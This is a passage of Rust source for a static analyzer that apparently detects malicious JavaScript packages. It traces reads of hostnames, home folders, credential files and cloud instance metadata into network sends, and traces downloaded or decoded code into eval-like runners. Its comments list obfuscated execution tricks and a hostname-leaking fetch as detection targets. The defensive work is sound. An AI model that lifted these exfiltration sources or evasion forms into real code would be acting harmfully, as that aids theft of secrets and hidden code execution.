    fn sc_const_strs(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> Option<Vec<PyStr>> {
        if depth > 8 || node == NONE {
            return None;
        }
        if let Some(s) = self.sc_const_str(node) {
            return Some(vec![s]);
        }
        match self.a().kind(node) {
            Kind::Identifier => {
                let b = self.bind(node, scope)?;
                let (module, writes, fid) = {
                    let bind = &self.p.binds[b as usize];
                    // (a declaration without a value writes nothing: `for (const c of …)`)
                    let writes: Vec<Write> = bind.writes.iter().filter(|w| !matches!(w, Write::Nothing { .. })).cloned().collect();
                    (bind.module, writes, bind.fid)
                };
                if module != self.m || writes.len() != 1 {
                    return None;
                }
                match &writes[0] {
                    Write::Init { node: v, scope: sc, path } if path.is_empty() => self.sc_const_strs(*v, *sc, depth + 1),
                    // an item of what a for-of loop goes over
                    Write::Opaque { node: st, scope: sc } if self.a().kind(*st) == Kind::ForOfStatement => {
                        let right = self.a().at(*st, jt::B);
                        self.sc_items(right, *sc, depth + 1)
                    }
                    // the first parameter of a callback given a list's items
                    Write::Param { index: 0, .. } => {
                        let fnode = self.p.fns[fid as usize].node;
                        let call = self.sc_call_of_arg(fnode)?;
                        let callee = self.a().unwrap(self.a().at(call, jt::A));
                        let a = self.a();
                        let iterates = a.kind(callee) == Kind::MemberExpression
                            && a.prop_name(callee).is_some_and(|n| {
                                is_one(&n, &["forEach", "map", "filter", "some", "every", "flatMap", "find"])
                            });
                        if !iterates {
                            return None;
                        }
                        let obj = a.at(callee, jt::A);
                        let fscope = self.p.fns[fid as usize].scope;
                        let outer = self.p.scopes[fscope as usize].parent.unwrap_or(fscope);
                        self.sc_items(obj, outer, depth + 1)
                    }
                    _ => None,
                }
            }
            // cmds[i]: any of its items
            Kind::MemberExpression if self.a().computed(node) => {
                let obj = self.a().at(node, jt::A);
                self.sc_items(obj, scope, depth + 1)
            }
            _ => None,
        }
    }

    /// The items of a constant list of strings (a literal, or a name given one).
    fn sc_items(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> Option<Vec<PyStr>> {
        if depth > 8 {
            return None;
        }
        match self.a().kind(node) {
            Kind::ArrayExpression => {
                let items = self.a().list(node, jt::A).to_vec();
                let mut out = Vec::new();
                for e in items.into_iter().take(64) {
                    if e != NONE {
                        out.extend(self.sc_const_strs(e, scope, depth + 1)?);
                    }
                }
                Some(out)
            }
            Kind::Identifier => {
                let b = self.bind(node, scope)?;
                let bind = &self.p.binds[b as usize];
                if bind.module != self.m || bind.writes.len() != 1 {
                    return None;
                }
                match bind.writes[0].clone() {
                    Write::Init { node: v, scope: sc, path } if path.is_empty() => self.sc_items(v, sc, depth + 1),
                    _ => None,
                }
            }
            _ => None,
        }
    }

    /// The call a function literal is given to as an argument, if any.
    fn sc_call_of_arg(&self, fnode: NodeId) -> Option<NodeId> {
        let sup = self.sup();
        if sup.arg_of.borrow().is_none() {
            let a = self.a();
            let mut map = std::collections::HashMap::new();
            for id in 0..a.0.nodes.len() as NodeId {
                if a.kind(id) == Kind::CallExpression {
                    for &arg in a.list(id, jt::B) {
                        if a.is_function(arg) {
                            map.insert(arg, id);
                        }
                    }
                }
            }
            *sup.arg_of.borrow_mut() = Some(map);
        }
        let got = sup.arg_of.borrow().as_ref().and_then(|m| m.get(&fnode).copied());
        got
    }

    /// The command line an exec call runs, when it is constant: its first
    /// argument (an argument list's items joined) and the string arguments
    /// after it.
    fn sc_command_line(&self, node: NodeId) -> Option<PyStr> {
        let a = self.a();
        let args = a.list(node, jt::B).to_vec();
        let first = *args.first()?;
        let mut argv: Vec<PyStr> = Vec::new();
        if a.kind(first) == Kind::ArrayExpression {
            for &e in a.list(first, jt::A) {
                if e != NONE {
                    if let Some(s) = self.sc_const_str(e) {
                        argv.push(s);
                    }
                }
            }
            if argv.is_empty() {
                return None;
            }
        } else {
            argv.push(self.sc_const_str(first)?);
        }
        for &e in args.iter().skip(1).take(8) {
            if a.kind(e) == Kind::ArrayExpression {
                for &x in a.list(e, jt::A) {
                    if x != NONE {
                        if let Some(s) = self.sc_const_str(x) {
                            argv.push(s);
                        }
                    }
                }
            } else if let Some(s) = self.sc_const_str(e) {
                argv.push(s);
            }
        }
        let parts: Vec<&[u32]> = argv.iter().map(|x| x.as_slice()).collect();
        Some(pystr::join(&u(" "), &parts))
    }

    /// Is a member's name one of the module table's (a cheap test first)?
    fn sc_reader_name(&self, name: &[u32]) -> bool {
        const NAMES: &[&str] = &["hostname", "userInfo", "homedir", "networkInterfaces", "getlogin", "uname"];
        is_one(name, NAMES)
    }

    /// The os module's names (and the user's or host's name under another
    /// module's): a read of local data, by the names a callee resolves to.
    fn sc_module_source(&self, names: &[PyStr], at: u32, line: u32) -> Option<V> {
        let sup = self.sup();
        let p = sup.p();
        for n in names {
            let n = n.as_slice();
            let k = match n.iter().position(|&c| c == 0x2E) {
                Some(k) => k,
                None => continue,
            };
            let (module, member) = (&n[..k], &n[k + 1..]);
            if let Some((_, kind)) = crate::flow::module_names(p, module).into_iter().find(|(name, _)| name.as_slice() == member) {
                let what = if eq(module, "os") && p.strs("_LD_OS_NAMED").iter().any(|x| x.as_slice() == member) {
                    member.to_vec()
                } else {
                    u("user or host name")
                };
                let v = self.sc_source(kind_bit(kind, &what, &sup.whole), what.clone(), at, line, 0);
                if eq(member, "homedir") {
                    // (and a path outside the package: a read under it is a file)
                    return Some(v.union(&self.sc_source(K_PATH, what, at, line, 0)));
                }
                return Some(v);
            }
        }
        None
    }

    /// A string literal: a path outside the package (a read of it is a
    /// file), else nothing.
    pub(super) fn sc_literal(&self, node: NodeId) -> V {
        let a = self.a();
        let value = match a.str_value(node) {
            Some(v) if !v.is_empty() => v,
            _ => return V::empty(),
        };
        let first = value[0];
        let drive = value.len() > 2 && (value[1] == 0x3A) && (value[2] == 0x5C || value[2] == 0x2F);
        if !(first == 0x2F || first == 0x7E || first == 0x24 || first == 0x25 || drive) {
            return V::empty();
        }
        let sup = self.sup();
        let n = &a.0.nodes[node as usize];
        // (a system folder, the home folder, a credential file; any absolute
        // path only where a read is given it whole: sc_source_call)
        let span = sup.span(n.start, n.end);
        if sup.p().re("_LD_FS_ROOT_RE").match_(span).is_none() && sup.p().re("_LD_CRED_FILE_RE").match_(span).is_none() {
            return V::empty();
        }
        self.sc_source(K_PATH, shown_what(sup.p(), value), n.start, a.line(node), 0)
    }

    /// An identifier no declaration binds (an implicit global, or one the
    /// script assigns): a binding the model keeps for its name.
    pub(super) fn sc_global_bind(&mut self, ident: NodeId) -> BindId {
        let name = self.a().name(ident).to_vec();
        let m = self.m;
        let key = (3u8, m, name.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return b;
        }
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        bid
    }

    /// A call that reads local data: its value, if it is one.
    fn sc_source_call(&mut self, node: NodeId, names: &[PyStr], args: &[V], scope: ScopeId) -> Option<V> {
        let sup = self.sup();
        let p = sup.p();
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        if let Some(v) = self.sc_module_source(names, at, line) {
            return Some(v);
        }
        let last: PyStr = names.first().map(|n| last_part(n).to_vec()).unwrap_or_else(|| {
            let a = self.a();
            let callee = a.unwrap(a.at(node, jt::A));
            if a.is_ident(callee) {
                a.name(callee).to_vec()
            } else if a.kind(callee) == Kind::MemberExpression {
                a.prop_name(callee).unwrap_or_default()
            } else {
                Vec::new()
            }
        });
        // what a command prints (a download's is received: sc_call)
        if is_one(&last, EXEC_NAMES) {
            if let Some(line_text) = self.sc_command_line(node) {
                if let Some((kind, what)) = crate::shell::sh_output_data(p, &line_text, 0, None).into_iter().next() {
                    return Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0));
                }
            } else if let Some(first) = self.a().list(node, jt::B).first().copied() {
                // (a command taken from a constant list: what any of them prints)
                if let Some(commands) = self.sc_const_strs(first, scope, 0) {
                    let mut out = V::empty();
                    for c in commands {
                        if let Some((kind, what)) = crate::shell::sh_output_data(p, &c, 0, None).into_iter().next() {
                            out = out.union(&self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0));
                        }
                    }
                    if out.tainted() {
                        return Some(out);
                    }
                }
            }
            return None;
        }
        // a file outside the package
        let readers = p.strs("_LD_READERS");
        if readers.iter().any(|r| r.as_slice() == last.as_slice()) && !p.strs("_LD_NOT_READS").iter().any(|r| r.as_slice() == last.as_slice()) {
            let a = self.a();
            if let Some(&first) = a.list(node, jt::B).first() {
                let (lo, hi) = (a.0.nodes[first as usize].start, a.0.nodes[first as usize].end);
                let outside = crate::flow::ld_outside(p, &sup.text, lo as usize, hi as usize, true, &sup.outside.borrow(), &sup.lit);
                if outside {
                    let arg = sup.span(lo, hi);
                    let what = match p.re("_LD_PLAIN_LITERAL_RE").match_(arg) {
                        Some(pl) => pl.group(2).unwrap_or(&[]).to_vec(),
                        None => arg.to_vec(),
                    };
                    return Some(self.sc_source(K_FILE, shown_what(p, &what), at, line, 0));
                }
                // (a path outside the package given it: a parameter, a name)
                if let Some(sc) = args.first().and_then(|v| v.sc.clone()) {
                    if let Some((_, what, _)) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH) {
                        return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
                    }
                }
                // (a parameter: the script's own reader, for its callers)
                if let Some(v) = args.first() {
                    if !v.params.is_empty() {
                        let label = Rc::new(self.p.fns[self.fid as usize].label());
                        let entry: Entry = (self.m, at, label, false);
                        for &key in v.params.iter() {
                            self.reach_adds.push((key, READ_PATH, entry.clone()));
                        }
                    }
                }
            }
            return None;
        }
        // the instance's metadata, the machine's public IP address
        if names.iter().any(|n| is_one(n, FETCHERS) || is_one(n, FETCH_MODULES)) {
            let a = self.a();
            let args = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (args.first(), args.last()) {
                let text = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                if p.re("_LD_METADATA_RE").search(text).is_some() {
                    return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, line, 0));
                }
                if p.re("_LD_PUBLIC_IP_RE").search(text).is_some() {
                    return Some(self.sc_source(K_ADDRESS, u("the machine's public IP address"), at, line, 0));
                }
            }
        }
        None
    }

    /// Is an argument a name composed with a literal (`h + '.x.com'`,
    /// a template with text), or a name given one?
    fn sc_composed(&self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
        let a = self.a();
        match a.kind(node) {
            Kind::TemplateLiteral => {
                !a.list(node, jt::B).is_empty() && a.list(node, jt::A).iter().any(|&q| !a.s(q, jt::A).is_empty())
            }
            Kind::BinaryExpression if a.operator(node) == "+" => {
                let mut n = node;
                let mut seen = 0;
                loop {
                    if a.is_string(a.at(n, jt::B)) {
                        return true;
                    }
                    let left = a.at(n, jt::A);
                    if a.is_string(left) {
                        return true;
                    }
                    if a.kind(left) == Kind::BinaryExpression && a.operator(left) == "+" && seen < ALIAS_DEPTH {
                        n = left;
                        seen += 1;
                        continue;
                    }
                    return false;
                }
            }
            Kind::CallExpression => {
                // 'x'.concat(…), [a, b].join('.')
                let callee = a.unwrap(a.at(node, jt::A));
                a.kind(callee) == Kind::MemberExpression
                    && a.prop_name(callee).is_some_and(|n| eq(&n, "concat") || eq(&n, "join"))
            }
            Kind::Identifier if depth < 2 => {
                let b = match self.bind(node, scope) {
                    Some(b) => b,
                    None => return false,
                };
                let writes = self.p.binds[b as usize].writes.clone();
                writes.iter().any(|w| match w {
                    Write::Init { node, scope, path } | Write::Assign { node, scope, path } if path.is_empty() => {
                        self.p.binds[b as usize].module == self.m && self.sc_composed(*node, *scope, depth + 1)
                    }
                    _ => false,
                })
            }
            _ => false,
        }
    }

    /// A send: what reaches its arguments, by role.
    fn sc_send(&mut self, node: NodeId, spec: Spec, args: &[V], spread: isize, scope: ScopeId) {
        let at = self.a().0.nodes[node as usize].start;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let label = Rc::new(self.p.fns[self.fid as usize].label());
        for (i, v) in args.iter().enumerate() {
            let address = spec.addresses < 0 || (spec.addresses > 0 && (i as i8) < spec.addresses);
            if spec.composed {
                match arg_nodes.get(i) {
                    Some(&n) if self.sc_composed(n, scope, 0) => {}
                    _ => continue,
                }
            }
            let v = if spread >= 0 && i as isize >= spread { union_all(args.iter().skip(i)) } else { v.clone() };
            self.sc_reach(&v, if address { SEND_ADDR } else { SEND_DATA }, at, &label);
            if spread >= 0 && i as isize >= spread {
                break;
            }
        }
    }

    /// A value at a send's argument: the parameters it holds reach the send
    /// (the function's summary); local data in it is the finding.
    pub(super) fn sc_reach(&mut self, v: &V, cat: u8, at: u32, label: &Rc<PyStr>) {
        if !v.tainted() {
            return;
        }
        let entry: Entry = (self.m, at, label.clone(), false);
        for &key in v.params.iter() {
            self.reach_adds.push((key, cat, entry.clone()));
        }
        if v.src && self.emit {
            if let Some(sc) = &v.sc {
                self.sc_emit(sc, cat == SEND_ADDR, at);
            }
        }
    }

    /// A received-code sink given `v` at `at`: the parameters it holds reach
    /// it (the function's summary); data received over the network in it is
    /// the finding.
    pub(super) fn sc_sink(&mut self, cat: u8, v: &V, at: u32) {
        if !v.tainted() {
            return;
        }
        let label = Rc::new(self.p.fns[self.fid as usize].label());
        let entry: Entry = (self.m, at, label, false);
        for &key in v.params.iter() {
            self.reach_adds.push((key, cat, entry.clone()));
        }
        if v.src && self.emit && v.sc.as_ref().is_some_and(|s| s.kinds & K_RECEIVED != 0) {
            if let Some(name) = received_cat(cat) {
                self.findings.push(Out::Received { at, cat: name });
            }
        }
        // (code the script decodes, run)
        if v.src && self.emit && cat == RUN_CODE {
            if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
                self.findings.push(Out::Decoded { at, from });
            }
        }
    }

    /// supply mode: a value the script decodes at `at` (`atob(x)`, a
    /// decryption …).
    pub(super) fn sc_decoded(&self, what: PyStr, at: u32, line: u32) -> V {
        self.sc_source(K_DECODED, what, at, line, 0)
    }

    /// A string a node folds to: a literal, a template without holes, their
    /// `+` (`'ev' + 'al'`).
    fn sc_fold(&self, node: NodeId, depth: u32) -> Option<PyStr> {
        if let Some(s) = self.sc_const_str(node) {
            return Some(s);
        }
        let a = self.a();
        if a.kind(node) == Kind::BinaryExpression && a.operator(node) == "+" && depth < 16 {
            let (l, r) = (a.at(node, jt::A), a.at(node, jt::B));
            let mut out = self.sc_fold(l, depth + 1)?;
            out.extend(self.sc_fold(r, depth + 1)?);
            return Some(out);
        }
        None
    }

    /// Does an expression come from the function's caller: a parameter of
    /// a function around it, `this`, `arguments`, or what is made of them
    /// (`options.url`, `` `${this.baseUrl}/x` ``, a loop's variable over
    /// `urls`)?
    pub(super) fn sc_from_caller(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
        if depth > 16 || node == NONE {
            return false;
        }
        let kind = self.a().kind(node);
        let parts: Vec<NodeId> = match kind {
            Kind::ThisExpression => return true,
            Kind::Identifier => {
                if self.a().is_ident_named(node, "arguments") {
                    return true;
                }
                let b = match self.bind(node, scope) {
                    Some(b) => b,
                    None => return false,
                };
                let (module, writes) = {
                    let bind = &self.p.binds[b as usize];
                    (bind.module, bind.writes.clone())
                };
                if module != self.m {
                    return false;
                }
                // (a parameter; one whose default is text the script writes is the
                // script's own when its caller gives nothing: `function get(o = OPTIONS)`,
                // a dropper's exported function called with no arguments)
                for w in writes.iter() {
                    if let Write::Param { node: p, scope: s, .. } = w {
                        if !self.sc_own_default(*p, *s, depth) {
                            return true;
                        }
                    }
                }
                // (a name given what comes from the caller; a loop's variable, an
                // item or a key of what it walks)
                return writes.iter().take(8).any(|w| match w {
                    Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
                        self.sc_from_caller(*v, *s, depth + 1)
                    }
                    Write::Opaque { node: v, scope: s }
                        if matches!(self.a().kind(*v), Kind::ForOfStatement | Kind::ForInStatement) =>
                    {
                        let right = self.a().at(*v, jt::B);
                        self.sc_from_caller(right, *s, depth + 1)
                    }
                    _ => false,
                });
            }
            Kind::MemberExpression => {
                let a = self.a();
                if a.computed(node) {
                    vec![a.at(node, jt::A), a.at(node, jt::B)]
                } else {
                    vec![a.at(node, jt::A)]
                }
            }
            Kind::TemplateLiteral => self.a().list(node, jt::B).to_vec(),
            Kind::BinaryExpression | Kind::LogicalExpression => vec![self.a().at(node, jt::A), self.a().at(node, jt::B)],
            Kind::ConditionalExpression => vec![self.a().at(node, jt::B), self.a().at(node, jt::C)],
            Kind::UnaryExpression | Kind::AwaitExpression | Kind::ChainExpression | Kind::SpreadElement => {
                vec![self.a().at(node, jt::A)]
            }
            Kind::ArrayExpression => self.a().list(node, jt::A).iter().copied().filter(|&e| e != NONE).collect(),
            Kind::ObjectExpression => {
                let props = self.a().list(node, jt::A).to_vec();
                props
                    .into_iter()
                    .map(|p| if self.a().kind(p) == Kind::Property { self.a().at(p, jt::B) } else { self.a().at(p, jt::A) })
                    .collect()
            }
            Kind::CallExpression | Kind::NewExpression => {
                let mut v = vec![self.a().at(node, jt::A)];
                v.extend(self.a().list(node, jt::B).iter().copied());
                v
            }
            _ => return false,
        };
        parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_from_caller(p, scope, depth + 1))
    }

    /// A parameter `p` (its node in the function's list) with a default the
    /// script writes itself, one no caller gives: `o = OPTIONS`, not `o = a`.
    fn sc_own_default(&mut self, p: NodeId, scope: ScopeId, depth: u32) -> bool {
        let (left, right) = {
            let a = self.a();
            if a.kind(p) != Kind::AssignmentPattern {
                return false;
            }
            (a.at(p, jt::A), a.at(p, jt::B))
        };
        self.a().is_ident(left) && !self.sc_from_caller(right, scope, depth + 1) && self.sc_constant_text(right, scope, depth + 1)
    }

    /// Is the value at `node` built from text the script writes: a string or
    /// template literal, in it or in what a name it reads is given (a
    /// constant's, an object or array literal's, a concatenation's part, a
    /// branch's, a call's argument or receiver, an item of what a loop
    /// walks), or from a global the page or another file defines (`src`)?
    /// A request's address that isn't is no address of the script's own,
    /// though its caller doesn't give it either: it is a library's, worked
    /// out from what it is given (Monaco's module loader fetches the module
    /// ids it is asked for, vitest's runner the modules a WebAssembly binary
    /// imports), or no address (an object: a namespace TypeScript's emit
    /// passes its module function).
    pub(super) fn sc_constant_text(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
        let mut seen: Vec<BindId> = Vec::new();
        self.sc_constant_text_in(node, scope, depth, true, &mut seen)
    }

    /// (each name read once: a name met again gave no constant the first
    /// time, or the reading would have stopped there; `value`: the node is
    /// read for its value, not called or read for a member)
    fn sc_constant_text_in(&mut self, node: NodeId, scope: ScopeId, depth: u32, value: bool, seen: &mut Vec<BindId>) -> bool {
        if depth > 16 || node == NONE {
            return false;
        }
        let kind = self.a().kind(node);
        let parts: Vec<NodeId> = match kind {
            Kind::Literal => return self.a().is_string(node),
            Kind::TaggedTemplateExpression => return true,
            Kind::TemplateLiteral => {
                let a = self.a();
                if a.list(node, jt::A).iter().any(|&q| !a.s(q, jt::A).is_empty()) {
                    return true;
                }
                a.list(node, jt::B).to_vec()
            }
            Kind::Identifier => {
                let b = match self.bind(node, scope) {
                    Some(b) => b,
                    // a name no declaration in the file binds, read for its value,
                    // is a global the page or another file defines (`axios.get(src)`):
                    // no caller gives it and nothing here works it out, so it is
                    // the script's own, as text is; the platform's objects (`window`,
                    // `global`, `location`), and a global read for a member or
                    // called (`location.href`, `new Map()`), are not
                    None => {
                        let name = self.a().name(node);
                        return value && !is_in(GLOBAL_OBJECTS, name) && !is_one(name, PLATFORM_NAMES);
                    }
                };
                if seen.contains(&b) {
                    return false;
                }
                seen.push(b);
                let (module, writes) = {
                    let bind = &self.p.binds[b as usize];
                    (bind.module, bind.writes.clone())
                };
                if module != self.m {
                    return false;
                }
                return writes.iter().take(8).any(|w| match w {
                    Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
                        self.sc_constant_text_in(*v, *s, depth + 1, value, seen)
                    }
                    // (a parameter's default: what it holds when no caller gives it)
                    Write::Param { node: p, scope: s, .. } if self.a().kind(*p) == Kind::AssignmentPattern => {
                        let (left, right) = (self.a().at(*p, jt::A), self.a().at(*p, jt::B));
                        self.a().is_ident(left) && self.sc_constant_text_in(right, *s, depth + 1, value, seen)
                    }
                    // (a loop's variable: an item, or a key, of what it walks)
                    Write::Opaque { node: v, scope: s }
                        if matches!(self.a().kind(*v), Kind::ForOfStatement | Kind::ForInStatement) =>
                    {
                        let right = self.a().at(*v, jt::B);
                        self.sc_constant_text_in(right, *s, depth + 1, true, seen)
                    }
                    _ => false,
                });
            }
            // (what a member is read from, and a call's callee, are not read for
            // their value: a constant one still gives text, `'…'.concat(x)`)
            Kind::MemberExpression => {
                let (obj, prop, computed) = {
                    let a = self.a();
                    (a.at(node, jt::A), a.at(node, jt::B), a.computed(node))
                };
                return self.sc_constant_text_in(obj, scope, depth + 1, false, seen)
                    || (computed && self.sc_constant_text_in(prop, scope, depth + 1, false, seen));
            }
            Kind::BinaryExpression | Kind::LogicalExpression => vec![self.a().at(node, jt::A), self.a().at(node, jt::B)],
            Kind::ConditionalExpression => vec![self.a().at(node, jt::B), self.a().at(node, jt::C)],
            Kind::UnaryExpression | Kind::AwaitExpression | Kind::ChainExpression | Kind::SpreadElement => {
                vec![self.a().at(node, jt::A)]
            }
            Kind::AssignmentExpression => vec![self.a().at(node, jt::B)],
            Kind::SequenceExpression => self.a().list(node, jt::A).iter().rev().take(1).copied().collect(),
            Kind::ArrayExpression => self.a().list(node, jt::A).iter().copied().filter(|&e| e != NONE).collect(),
            Kind::ObjectExpression => {
                let props = self.a().list(node, jt::A).to_vec();
                props
                    .into_iter()
                    .map(|p| if self.a().kind(p) == Kind::Property { self.a().at(p, jt::B) } else { self.a().at(p, jt::A) })
                    .collect()
            }
            Kind::CallExpression | Kind::NewExpression => {
                let callee = self.a().at(node, jt::A);
                if !self.a().is_function(callee) && self.sc_constant_text_in(callee, scope, depth + 1, false, seen) {
                    return true;
                }
                self.a().list(node, jt::B).to_vec()
            }
            _ => return false,
        };
        parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_constant_text_in(p, scope, depth + 1, true, seen))
    }

    /// Is a receiving call's address the script's own — what the script
    /// read or received (`fetch('https://…' + os.hostname())`, a dead drop's
    /// address), or text the script writes, or a global, that its caller
    /// doesn't give it — rather than one a caller gives (a library's request
    /// for its user: `load(url)`, `request(options)`, `${this.baseUrl}`, an
    /// item of a list it is given) or one it works out from what it is given
    /// (sc_constant_text)? A server's and a socket's data are their own.
    fn sc_own_address(&mut self, node: NodeId, names: &[PyStr], member: bool, args: &[V], scope: ScopeId) -> bool {
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let own = |me: &mut Self, i: usize| -> bool {
            match (arg_nodes.get(i), args.get(i)) {
                (Some(&n), Some(v)) => {
                    (v.src && v.params.is_empty()) || (!me.sc_from_caller(n, scope, 0) && me.sc_constant_text(n, scope, 0))
                }
                (Some(&n), None) => !me.sc_from_caller(n, scope, 0) && me.sc_constant_text(n, scope, 0),
                _ => false,
            }
        };
        // servers and sockets: what they are sent
        if names.iter().any(|n| {
            is_one(
                n,
                &[
                    "http.createServer", "https.createServer", "http2.createServer", "http2.createSecureServer",
                    "net.createServer", "tls.createServer", "dgram.createSocket",
                ],
            )
        }) {
            return true;
        }
        // a connection: (port, host) or (options); no host is this machine
        if names.iter().any(|n| is_one(n, &["net.connect", "net.createConnection", "tls.connect"])) {
            let first_is_obj = arg_nodes.first().is_some_and(|&n| self.a().kind(n) == Kind::ObjectExpression);
            if first_is_obj || arg_nodes.len() < 2 || self.a().is_function(arg_nodes[1]) {
                return own(self, 0);
            }
            return own(self, 1);
        }
        // axios(config), axios.request(config): its url
        if !member || names.iter().any(|n| eq(n, "axios.request")) {
            if names.iter().any(|n| eq(n, "axios") || eq(n, "axios.request")) {
                return own(self, 0);
            }
        }
        own(self, 0)
    }

    /// A call of the script's own downloader (its parameter `i` is a
    /// request's address: `const get = (u) => fetch(u)`), given the
    /// script's own address (as sc_own_address reads one): what it returns
    /// is received.
    pub(super) fn sc_wrapper_receives(&mut self, node: NodeId, i: usize, t: &V) -> Option<V> {
        let arg = {
            let a = self.a();
            if !matches!(a.kind(node), Kind::CallExpression | Kind::NewExpression) {
                return None;
            }
            let args = a.list(node, jt::B);
            if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                return None;
            }
            *args.get(i)?
        };
        let scope = self.cur;
        if !((t.src && t.params.is_empty()) || (!self.sc_from_caller(arg, scope, 0) && self.sc_constant_text(arg, scope, 0))) {
            return None;
        }
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        Some(self.sc_source(K_RECEIVED, u("a download"), at, line, 0))
    }

    /// `process.env.NAME` (and `process.env['NAME']`): a binding the model
    /// keeps for what the script stores there.
    pub(super) fn sc_env_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
        let name = {
            let a = self.a();
            if a.kind(member) != Kind::MemberExpression {
                return None;
            }
            let obj = a.at(member, jt::A);
            let env = a.kind(obj) == Kind::MemberExpression
                && !a.computed(obj)
                && a.prop_name(obj).is_some_and(|n| eq(&n, "env"))
                && a.is_ident_named(a.at(obj, jt::A), "process");
            if !env {
                return None;
            }
            (a.prop_name(member)?, a.at(a.at(member, jt::A), jt::A))
        };
        if self.bind(name.1, scope).is_some() {
            return None;
        }
        let key = (4u8, self.m, name.0.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return Some(b);
        }
        let m = self.m;
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name: name.0,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        Some(bid)
    }

    /// The arguments of a call that are runners themselves (`eval`,
    /// `Function`, `vm.runInThisContext`, given as a callback): each runs
    /// what the call holds.
    fn sc_runner_args(&mut self, node: NodeId, held: &V, scope: ScopeId) {
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        for an in arg_nodes {
            let k = self.a().kind(an);
            if !matches!(k, Kind::Identifier | Kind::MemberExpression) {
                continue;
            }
            let on = self.sc_names(an, scope);
            if runs_of(&on).is_some_and(|r| r.cat == RUN_CODE) {
                let at = self.a().0.nodes[an as usize].start;
                self.sc_sink(RUN_CODE, held, at);
                return;
            }
        }
    }

    /// Does a call's command line begin with a fixed program that is not an
    /// interpreter given code (`_DL_EMBED_RE`): a template or a `+` whose
    /// first part is text?
    fn sc_fixed_program(&mut self, node: NodeId, scope: ScopeId) -> bool {
        let first = match self.a().list(node, jt::B).first() {
            Some(&f) => f,
            None => return false,
        };
        // (a name given the command line: what it was first given)
        let first = if self.a().kind(first) == Kind::Identifier {
            let init = self.bind(first, scope).and_then(|b| {
                let bind = &self.p.binds[b as usize];
                if bind.module != self.m {
                    return None;
                }
                bind.writes.iter().find_map(|w| match w {
                    Write::Init { node: v, path, .. } if path.is_empty() => Some(*v),
                    _ => None,
                })
            });
            match init {
                Some(v) => v,
                None => return false,
            }
        } else {
            first
        };
        let a = self.a();
        let mut lead = first;
        let mut seen = 0;
        while a.kind(lead) == Kind::BinaryExpression && a.operator(lead) == "+" && seen < 64 {
            lead = a.at(lead, jt::A);
            seen += 1;
        }
        let prefix: PyStr = match a.kind(lead) {
            Kind::TemplateLiteral => a.list(lead, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()).unwrap_or_default(),
            _ if lead != first => match a.str_value(lead) {
                Some(s) => s.to_vec(),
                None => return false,
            },
            _ => return false,
        };
        if pystr::strip(&prefix).is_empty() {
            return false;
        }
        let n = &a.0.nodes[lead as usize];
        let sup = self.sup();
        sup.p().re("_DL_EMBED_RE").match_(sup.span(n.start, n.end)).is_none()
    }

    /// The received-code sink a call is, if any: by its callee's names, and
    /// by the forms names don't give (`m._compile(code)`, `eval.call(t,
    /// code)`, `eval.bind(t)(code)`, `o['ev' + 'al'](code)`,
    /// `[].constructor.constructor(code)`, an interpreter given `-e` and code).
    fn sc_runs(&mut self, node: NodeId, callee: NodeId, names: &[PyStr], scope: ScopeId) -> Option<Runs> {
        if let Some(r) = runs_of(names) {
            return Some(r);
        }
        // an interpreter given code: spawn('node', ['-e', code])
        const SPAWNS: &[&str] = &["spawn", "spawnSync", "execFile", "execFileSync"];
        if names.iter().any(|n| n.len() > 14 && eq(&n[..14], "child_process.") && is_one(&n[14..], SPAWNS)) && self.sc_interp(node) {
            return Some(Runs { cat: RUN_CODE, from: 1, rest: false });
        }
        let (kind, member) = {
            let a = self.a();
            (a.kind(callee), a.kind(callee) == Kind::MemberExpression)
        };
        // eval.bind(t)(code)
        if kind == Kind::CallExpression {
            let inner = self.a().unwrap(self.a().at(callee, jt::A));
            if self.a().kind(inner) == Kind::MemberExpression && self.a().prop_name(inner).is_some_and(|n| eq(&n, "bind")) {
                let obj = self.a().at(inner, jt::A);
                let on = self.sc_names(obj, scope);
                if runs_of(&on).is_some_and(|r| r.cat == RUN_CODE) {
                    return Some(Runs { cat: RUN_CODE, from: 0, rest: true });
                }
            }
            return None;
        }
        if !member {
            return None;
        }
        let (obj, name, computed) = {
            let a = self.a();
            (a.at(callee, jt::A), a.prop_name(callee), a.computed(callee))
        };
        let name = match name {
            Some(n) => n,
            None if computed => match self.sc_fold(self.a().at(callee, jt::B), 0) {
                Some(n) => n,
                None => return None,
            },
            None => return None,
        };
